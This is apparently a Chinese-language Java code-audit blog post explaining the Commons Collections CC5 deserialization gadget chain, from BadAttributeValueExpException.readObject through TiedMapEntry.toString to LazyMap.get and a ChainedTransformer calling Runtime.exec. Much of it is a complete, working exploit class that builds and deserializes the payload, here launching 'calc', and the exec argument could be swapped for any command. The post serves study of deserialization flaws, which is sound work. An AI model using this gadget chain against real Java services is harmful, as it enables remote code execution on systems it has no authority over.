---
title: cc5
date: 2026-08-06 14:47:52
categories:
  - java代码审计
tags:
  - Java
  - 反序列化
  - Commons Collections
---

## cc5

让我找这里肯定很难找出来，去看了 yso 的官方链子，入口类是 `BadAttributeValueExpException` 的 `readObject()` 方法，这一个倒是不难。关键是后面的。

逆向思维来看的话，`LazyMap.get()` 方法被 `TiedMapEntry.toString()` 所调用，而如果去找谁调用了 `toString()` 这也太多了，太难找了，我们只能正向分析。

- 直接看官方的链子，再去写 EXP 吧。

![image-20260806112512786](/images/java-code-audit/06-cc5/20260806112512961.png)

BadAttributeValueExpException的readObject这个方法调用tostring

法，然后 `TiedMapEntry` 这个类调用了 `toString()` 方法。

![image-20260806112717447](/images/java-code-audit/06-cc5/20260806112717508.png)

`TiedMapEntry` 这个类的 `toString()` 方法调用了 `getValue()` 方法，在 `getValue()` 方法中，我们看到了 `get()` 方法被调用，这就和后续的 `LazyMap.get()` 对应起来了。

![image-20260806112800534](/images/java-code-audit/06-cc5/20260806112800586.png)

下一步我们写 `TiedMapEntry` 类调用 `toString()` 方法的 EXP。

### 2. TiedMapEntry.toString() EXP 编写

这一步不是很难，因为 `TiedMapEntry` 这个类继承了反序列化，并且是 public 的类，可操纵性非常强。

EXP 的逻辑这里我觉得也挺简单的，先看 `TiedMapEntry` 的构造方法，`TiedMapEntry` 的构造方法中的 map 后续进行了 `map.get(key)` 的操作，所以只需要将 map 赋值为 decorateMap 即可。

![image-20260806141208318](/images/java-code-audit/06-cc5/20260806141208487.png)

最终exp

```java
package com.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap, "value");
        tiedMapEntry.toString();
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class c = Class.forName("javax.management.BadAttributeValueExpException");
        Field field = c.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

